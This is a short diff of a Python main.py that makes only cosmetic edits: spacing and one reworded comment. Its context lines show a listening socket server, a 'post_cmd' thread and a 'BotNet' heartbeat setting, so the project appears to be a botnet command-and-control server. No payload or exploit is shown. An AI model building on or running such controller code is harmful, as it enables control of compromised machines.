@@ -2,6 +2,7 @@
 # @FileName  :main.py
 # @Author    :D0WE1L1N
 import threading, socket, time, json
+
 from sys import path
 from urllib import request as req
 from platform import system as system_type
@@ -529,7 +530,7 @@ if __name__ == '__main__':
                                              
                                                                
 """  + '\033[0m')
-    # See if initialization is required
+    # Check if initialization is required
     if not os_path.exists("./Data"):
         print_normal("Initializing......")
         mkdir("./Data") #Create the data folder
@@ -578,7 +579,6 @@ if __name__ == '__main__':
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.bind((ip, port))
     s.listen(5)  # Maximum number of queued connections
-
     threading.Thread(target=run, args=()).start()
     threading.Thread(target=post_cmd, args=()).start()
     if settings_data['BotNet']['Heartbeat']:
